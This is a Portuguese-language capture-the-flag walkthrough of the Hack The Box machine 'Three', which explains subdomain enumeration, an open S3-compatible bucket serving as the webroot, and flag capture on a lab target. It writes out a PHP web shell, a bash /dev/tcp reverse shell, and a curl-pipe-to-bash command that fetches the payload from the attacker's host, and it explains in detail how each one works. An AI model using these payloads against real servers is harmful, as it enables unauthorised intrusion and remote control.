# Guia de Resolução: Hack The Box - Three

Este documento é um guia de estudo para o desafio "Three". Ele detalha uma cadeia de exploração que envolve a enumeração de subdomínios, a interação com um bucket S3 mal configurado usando `awscli`, o upload de um web shell PHP para obter execução remota de comandos (RCE) e, finalmente, a obtenção de um reverse shell para capturar a flag.

---

## Introdução: Configuração de Nuvem e Buckets S3

Muitas organizações utilizam serviços de armazenamento em nuvem como o Amazon S3 (Simple Storage Service) para diversas finalidades. O S3 armazena dados em "buckets", que são contêineres para objetos (arquivos). Uma configuração inadequada desses buckets pode levar a vulnerabilidades sérias, como acesso não autorizado, listagem de arquivos e até mesmo a capacidade de upload de arquivos, como explorado nesta máquina. A máquina "Three" simula um ambiente onde um servidor web Apache utiliza um bucket S3 (neste caso, provavelmente um serviço compatível com S3 como LocalStack ou MinIO, dado o contexto de CTF) como seu webroot.

---

## Fase 1: Enumeração Inicial - Servidor Web e Descoberta de Domínio

Os primeiros passos envolvem identificar os serviços em execução e entender a configuração do servidor web.

### 1. Explicação Didática

> Imagine que você está investigando um prédio comercial. Primeiro, você verifica as portas principais (scan `nmap`) e encontra uma entrada para o público (servidor web na porta 80) e uma porta de manutenção (SSH na porta 22). Ao entrar no saguão (acessar o site), você percebe que o nome do prédio é "thetoppers.htb" e que ele parece ter diferentes seções ou "alas" (subdomínios).

### 2. Explicação Técnica (Passo a Passo)

1.  **Enumeração de Portas e Serviços:** Utilizamos o `nmap`.

    *   **Comando:**
        ```bash
        sudo nmap -sV {IP_DO_ALVO}
        ```
    *   **Explicação dos Parâmetros:**
        *   `sudo`: Para detecção de versão que pode precisar de privilégios.
        *   `nmap`: A ferramenta.
        *   `-sV`: Tenta identificar a versão dos serviços.
        *   `{IP_DO_ALVO}`: O IP da máquina "Three".

    *   **Resultado:**
        *   **Porta 22/tcp (SSH):** `OpenSSH 7.6p1 Ubuntu 4ubuntu0.7`.
        *   **Porta 80/tcp (HTTP):** `Apache httpd 2.4.29 ((Ubuntu))`.

2.  **Enumeração da Aplicação Web (Porta 80):**
    *   Acessar `http://{IP_DO_ALVO}` mostra uma página estática de uma banda chamada "The Toppers".
    *   Analisando o código fonte, o formulário de contato (`/action_page.php`) indica que o backend usa PHP.
    *   A seção "Contact" revela o domínio `thetoppers.htb`.
    *   **Modificar o arquivo `/etc/hosts` (na máquina atacante):** Para acessar o site usando o nome de domínio, adicionamos:
        ```bash
        echo "{IP_DO_ALVO} thetoppers.htb" | sudo tee -a /etc/hosts
        ```

3.  **Enumeração de Subdomínios (Virtual Hosts):** Como temos um domínio, é importante verificar se existem subdomínios hospedados no mesmo IP. Usamos `gobuster` no modo `vhost`.

    *   **Comando:**
        ```bash
        gobuster vhost -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://thetoppers.htb
        ```
        (Nota: Se usar Gobuster >= 3.2.0, adicione `--append-domain` para que ele teste `palavra.thetoppers.htb`).
    *   **Explicação dos Parâmetros:**
        *   `gobuster vhost`: Modo de enumeração de virtual hosts.
        *   `-w ...`: Caminho para a wordlist de subdomínios.
        *   `-u http://thetoppers.htb`: A URL base (o domínio principal é usado para construir os cabeçalhos Host).

    *   **Resultado:** `gobuster` encontra o subdomínio `s3.thetoppers.htb` (Status: 404, Size: 21). O status 404 com um tamanho pequeno é interessante porque difere da resposta padrão, sugerindo que o vhost existe mas pode não ter um arquivo raiz padrão ou está configurado de forma diferente.

4.  **Acesso ao Subdomínio S3:**
    *   **Modificar o arquivo `/etc/hosts` novamente:**
        ```bash
        echo "{IP_DO_ALVO} s3.thetoppers.htb" | sudo tee -a /etc/hosts
        ```
    *   Acessar `http://s3.thetoppers.htb` no navegador retorna um JSON: `{"status": "running"}`. Isso confirma que o subdomínio está ativo e provavelmente aponta para um serviço compatível com a API S3.

---

## Vulnerabilidade 1: Interação com Bucket S3 Mal Configurado

O subdomínio `s3.thetoppers.htb` parece ser um endpoint para um serviço de armazenamento de objetos compatível com S3. A exploração se baseia na possibilidade de listar e fazer upload de arquivos para este bucket, indicando permissões excessivas.

### 1. Explicação Didática

> A "ala" `s3.thetoppers.htb` do prédio é um grande depósito de arquivos (o bucket S3). Descobrimos que não só podemos ver a lista de todos os contêineres neste depósito, mas também podemos colocar nossos próprios arquivos lá dentro, e esses arquivos ficam acessíveis através do site principal da banda.

### 2. Explicação Técnica (Passo a Passo)

1.  **Instalação e Configuração do `awscli`:** Para interagir com serviços S3, usamos a interface de linha de comando da AWS (`awscli`).

    *   **Instalação (se necessário):**
        ```bash
        sudo apt install awscli
        ```
    *   **Configuração:**
        ```bash
        aws configure
        ```
        Quando solicitado `AWS Access Key ID`, `AWS Secret Access Key`, `Default region name`, e `Default output format`, podemos inserir valores arbitrários como `temp` para cada um. O servidor S3 nesta máquina não parece validar essas credenciais para as operações que vamos realizar, mas o `awscli` requer que algo seja configurado.

2.  **Listagem de Buckets S3:** Usamos `awscli` para listar os buckets disponíveis no endpoint `s3.thetoppers.htb`.

    *   **Comando:**
        ```bash
        aws --endpoint-url=http://s3.thetoppers.htb s3 ls
        ```
    *   **Explicação dos Parâmetros:**
        *   `aws`: O comando da CLI.
        *   `--endpoint-url=http://s3.thetoppers.htb`: Especifica o endpoint do serviço S3 (em vez do S3 real da AWS).
        *   `s3 ls`: Subcomando para listar buckets S3.

    *   **Resultado:**
        ```
        2022-07-21 18:35:09 thetoppers.htb
        ```
        Há um bucket chamado `thetoppers.htb`.

3.  **Listagem de Objetos no Bucket `thetoppers.htb`:**

    *   **Comando:**
        ```bash
        aws --endpoint-url=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
        ```
    *   **Resultado:**
        ```
        PRE images/
        2022-07-21 18:35:09          0 .htaccess
        2022-07-21 18:35:10      11952 index.php
        ```
        Isso se parece com o webroot do site `http://thetoppers.htb`. O servidor Apache está usando este bucket S3 como seu diretório raiz.

---

## Vulnerabilidade 2: Upload de Web Shell e Execução Remota de Comandos (RCE)

Como podemos listar o conteúdo do bucket S3 que serve como webroot e o site usa PHP, podemos tentar fazer upload de um web shell PHP para obter RCE.

### 1. Explicação Didática

> Já que podemos colocar arquivos no depósito (bucket S3) e esses arquivos são servidos pelo site principal, vamos colocar um "arquivo especial" (o web shell PHP) lá. Quando acessamos este arquivo especial através do site, ele nos dá um controle remoto para executar comandos no servidor.

### 2. Explicação Técnica (Passo a Passo)

1.  **Criação do Web Shell PHP Simples:** Criamos um arquivo `shell.php` com um one-liner PHP que executa comandos passados via parâmetro GET `cmd`.

    *   **Conteúdo de `shell.php`:**
        ```php
        <?php system($_GET["cmd"]); ?>
        ```
    *   **Criar o arquivo:**
        ```bash
        echo '<?php system($_GET["cmd"]); ?>' > shell.php
        ```

2.  **Upload do Web Shell para o Bucket S3:**

    *   **Comando:**
        ```bash
        aws --endpoint-url=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb/shell.php
        ```
    *   **Explicação:**
        *   `s3 cp shell.php s3://thetoppers.htb/shell.php`: Copia o arquivo local `shell.php` para o bucket `thetoppers.htb` com o nome `shell.php` na raiz do bucket.
    *   **Resultado:** `upload: ./shell.php to s3://thetoppers.htb/shell.php`

3.  **Verificação do RCE:** Acessamos o web shell através do navegador, passando um comando para ser executado.

    *   **URL:**
        ```
        http://thetoppers.htb/shell.php?cmd=id
        ```
    *   **Resultado:** A página exibe a saída do comando `id`: `uid=33(www-data) gid=33(www-data) groups=33(www-data)`. Isso confirma que temos RCE como o usuário `www-data`.

---

## Fase 2: Obtenção de Reverse Shell

Com RCE confirmado, o próximo passo é obter um shell interativo no servidor.

### 1. Explicação Didática

> O "controle remoto" (web shell) é bom para executar comandos simples, mas para um controle mais completo, queremos uma "linha direta" (reverse shell) para o servidor. Preparamos nosso telefone (listener `nc`) para receber a ligação e instruímos o servidor (via web shell) a nos ligar de volta.

### 2. Explicação Técnica (Passo a Passo)

1.  **Obter o IP da Máquina Atacante:** Precisamos do IP da nossa interface de rede que o servidor alvo pode alcançar (ex: `tun0` se estiver usando VPN HTB).
    ```bash
    ifconfig tun0
    ```
    Anote seu IP (ex: `10.10.14.32`).

2.  **Criar o Script de Reverse Shell (na máquina atacante):** Crie um arquivo `shell.sh`.
    ```bash
    #!/bin/bash
    bash -i >& /dev/tcp/{SEU_IP_ATACANTE}/1337 0>&1
    ```
    Substitua `{SEU_IP_ATACANTE}` pelo seu IP.
    *   **Criar o arquivo:**
        ```bash
        echo '#!/bin/bash' > shell.sh
        echo 'bash -i >& /dev/tcp/{SEU_IP_ATACANTE}/1337 0>&1' >> shell.sh
        ```

3.  **Iniciar um Listener `nc` (na máquina atacante):**
    ```bash
    nc -nvlp 1337
    ```
    Isso escutará na porta 1337 por conexões de entrada.

4.  **Iniciar um Servidor HTTP Simples (na máquina atacante):** Para servir o `shell.sh` ao alvo. Execute isso no diretório onde `shell.sh` está localizado.
    ```bash
    python3 -m http.server 8000
    ```

5.  **Executar o Reverse Shell no Alvo (via web shell):**
    Usamos o web shell para fazer o servidor baixar e executar nosso `shell.sh`. O comando `curl` baixa o script e o `bash` o executa.

    *   **URL (codificada para o navegador, com o pipe escapado):**
        ```
        http://thetoppers.htb/shell.php?cmd=curl%20{SEU_IP_ATACANTE}:8000/shell.sh\|bash
        ```
        (Substitua `{SEU_IP_ATACANTE}` pelo seu IP).
        **Alternativa (pipe codificado como URL):**
        ```
        http://thetoppers.htb/shell.php?cmd=curl%20{SEU_IP_ATACANTE}:8000/shell.sh%7Cbash
        ```

    *   **O que acontece:**
        1.  O servidor web (`www-data`) executa o comando passado no parâmetro `cmd`.
        2.  Este comando é `curl {SEU_IP_ATACANTE}:8000/shell.sh | bash` (o `\|` ou `%7C` garante que o pipe seja interpretado no servidor alvo).
        3.  O `curl` no servidor alvo baixa o conteúdo do `shell.sh` do seu servidor Python.
        4.  A saída do `curl` (o script) é enviada via pipe (`|`) para `bash` no servidor alvo.
        5.  `bash` no servidor alvo executa o script, que tenta se conectar de volta ao seu listener `nc` na porta 1337.

6.  **Receber o Reverse Shell:** Seu listener `nc` deve receber uma conexão. Você terá um shell interativo como `www-data`.
    ```
    Ncat: Connection from {IP_DO_ALVO}.
    Ncat: Connection from {IP_DO_ALVO}:35172.
    www-data@three:/var/www/html$ id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    ```

---

## Captura da Flag

A flag está localizada em `/var/www/flag.txt`.

*   **Comando no reverse shell:**
    ```bash
    cat /var/www/flag.txt
    ```
*   **Flag:**
    <details>
      <summary>Clique para revelar a flag</summary>
      <p><i>A flag real seria exibida aqui. Como este é um exemplo, vamos supor que seja algo como <code>HTB{S3_AND_PHP_SHELLS_ARE_FUN}</code>.</i></p>
    </details>

---

Parabéns! Você completou a máquina "Three" explorando um bucket S3 mal configurado para obter RCE e, em seguida, um reverse shell.

---

## Aprofundamento: Entendendo `shell.php` e `shell.sh`

Vamos destrinchar como esses dois pequenos scripts trabalham juntos para lhe dar um reverse shell.

### 1. `shell.php` - O Mensageiro no Servidor Alvo

*   **Conteúdo:**
    ```php
    <?php system($_GET["cmd"]); ?>
    ```

*   **O que ele faz, passo a passo:**
    1.  `<?php ... ?>`: Isso diz ao servidor web Apache (que está configurado para processar arquivos `.php`) que o conteúdo dentro dessas tags é código PHP e deve ser executado pelo interpretador PHP.
    2.  `$_GET`: Em PHP, `$_GET` é uma **superglobal array associativo**. Ela contém todas as variáveis passadas para o script atual através dos parâmetros da URL (a parte depois do `?`).
        *   Por exemplo, se você acessa `http://thetoppers.htb/shell.php?cmd=ls&user=admin`, então:
            *   `$_GET["cmd"]` conteria a string `"ls"`.
            *   `$_GET["user"]` conteria a string `"admin"`.
    3.  `$_GET["cmd"]`: Especificamente, estamos pegando o valor associado à chave `"cmd"` na URL. No nosso caso de RCE, o valor de `"cmd"` é o comando que queremos que o servidor execute (ex: `id`, ou `curl ... | bash`).
    4.  `system()`: Esta é uma função PHP que executa um comando externo do sistema operacional e exibe a saída.
        *   Ela pega uma string como argumento (no nosso caso, o valor de `$_GET["cmd"]`).
        *   Ela passa essa string para o shell padrão do sistema operacional do servidor (geralmente `/bin/sh` ou `/bin/bash` em sistemas Linux).
        *   O shell do servidor então executa o comando.
        *   Qualquer saída que o comando produzir (stdout) é retornada pela função `system()` e, por padrão, também é enviada diretamente para a saída HTTP (ou seja, seu navegador ou a saída do seu `curl`).

*   **Em resumo:** `shell.php` é um web shell extremamente simples. Ele espera um parâmetro `cmd` na URL, pega o valor desse parâmetro e o executa como um comando no servidor alvo, sob as permissões do usuário que o servidor web está rodando (neste caso, `www-data`). Ele é o nosso "mensageiro" que leva nossas ordens para o servidor.

### 2. `shell.sh` - O Script de Ligação Reversa (Payload)

*   **Conteúdo:**
    ```bash
    #!/bin/bash
    bash -i >& /dev/tcp/{SEU_IP_ATACANTE}/1337 0>&1
    ```

*   **O que ele faz, passo a passo:**
    1.  `#!/bin/bash`: Esta é a "shebang". Ela diz ao sistema operacional que este arquivo é um script e deve ser executado usando o interpretador `/bin/bash`. Quando o `shell.php` executa `... | bash`, o conteúdo deste script é alimentado para uma nova instância do `bash` no servidor alvo.
    2.  `bash -i`:
        *   `bash`: Inicia uma nova instância do shell Bash.
        *   `-i`: Esta é a flag crucial. Ela diz ao Bash para rodar em **modo interativo**. Um shell interativo se comporta de maneira diferente de um shell não interativo (que apenas executa um script e sai). Ele mantém o estado, tem prompts, lida com controle de jobs, etc. Isso é o que nos permite ter um "prompt" real do servidor alvo.
    3.  `/dev/tcp/{SEU_IP_ATACANTE}/1337`: Esta é uma funcionalidade especial do Bash (e alguns outros shells como zsh). **Não é um arquivo real no sistema de arquivos.**
        *   Quando o Bash encontra um caminho que se parece com `/dev/tcp/HOST/PORT` em um contexto de redirecionamento, ele tenta abrir uma conexão TCP para o `HOST` especificado na `PORTA` especificada.
        *   No nosso caso, `{SEU_IP_ATACANTE}` é o IP da sua máquina onde o `nc` está escutando, e `1337` é a porta que o `nc` está escutando.
        *   Então, esta parte do comando faz o Bash no servidor alvo tentar se conectar à sua máquina na porta 1337.
    4.  `>& /dev/tcp/{SEU_IP_ATACANTE}/1337`:
        *   `>`: É um operador de redirecionamento de saída.
        *   `&`: Quando usado com `>`, como em `>&`, significa redirecionar **tanto o Standard Output (stdout, descritor de arquivo 1) quanto o Standard Error (stderr, descritor de arquivo 2)** do comando `bash -i` para o destino especificado.
        *   Então, toda a saída normal e todos os erros do shell interativo `bash -i` serão enviados através da conexão TCP para a sua máquina.
    5.  `0>&1`:
        *   `0<`: É um operador de redirecionamento de entrada (stdin, descritor de arquivo 0).
        *   `&1`: Significa "para onde o descritor de arquivo 1 (stdout) está atualmente apontando".
        *   Como o stdout (`&1`) já foi redirecionado para a conexão TCP (`/dev/tcp/...`), esta parte efetivamente diz: "pegue a entrada para o shell interativo `bash -i` da mesma conexão TCP".

*   **Em resumo:** `shell.sh`, quando executado no servidor alvo, faz o seguinte:
    1.  Inicia um novo shell Bash interativo.
    2.  Estabelece uma conexão TCP de saída do servidor alvo para a sua máquina atacante (onde o `nc` está escutando).
    3.  Conecta a saída padrão (stdout) e o erro padrão (stderr) desse shell Bash interativo à conexão TCP. Qualquer coisa que o shell no servidor produzir (resultados de comandos, erros) será enviada para o seu `nc`.
    4.  Conecta a entrada padrão (stdin) desse shell Bash interativo à mesma conexão TCP. Qualquer coisa que você digitar no seu `nc` será enviada para o shell no servidor como entrada de comando.

### 3. A Interação Mágica: `shell.php` + `curl ... | bash` + `shell.sh`

1.  **Sua Máquina (Atacante):**
    *   Você tem `nc -nvlp 1337` escutando por conexões.
    *   Você tem `python3 -m http.server 8000` servindo o arquivo `shell.sh`.
    *   Você executa: `curl "http://thetoppers.htb/shell.php?cmd=curl%20{SEU_IP_ATACANTE}:8000/shell.sh\|bash"`

2.  **Servidor Alvo (`thetoppers.htb`):**
    *   O Apache recebe a requisição para `shell.php`.
    *   O PHP executa `system("curl {SEU_IP_ATACANTE}:8000/shell.sh|bash")`.
    *   **Dentro do `system()`:**
        *   O comando `curl {SEU_IP_ATACANTE}:8000/shell.sh` é executado primeiro. Ele baixa o conteúdo do `shell.sh` do seu servidor Python. A saída deste `curl` é o *texto* do script `shell.sh`.
        *   O pipe `|` pega essa saída (o texto do `shell.sh`) e a envia como entrada padrão para o comando `bash`.
        *   O comando `bash` então executa as instruções contidas no `shell.sh` (que acabamos de detalhar acima).
        *   O `shell.sh` (agora rodando no servidor alvo) faz a conexão TCP de volta para o seu `nc` na porta 1337 e amarra o I/O do `bash -i` a essa conexão.

3.  **Resultado:**
    *   Seu `nc` recebe a conexão.
    *   Agora, quando você digita no `nc`, os dados viajam pela conexão TCP, chegam ao `bash -i` no servidor alvo como stdin, o comando é executado, e a saída/erro viaja de volta pela mesma conexão TCP para o seu `nc`, que a exibe.
    *   Você tem um shell interativo no servidor alvo!

É uma cadeia engenhosa de eventos: um web shell simples (`shell.php`) é usado para executar um comando que baixa (`curl`) e executa (`| bash`) um script (`shell.sh`) que estabelece uma conexão de volta para você, dando-lhe controle interativo.
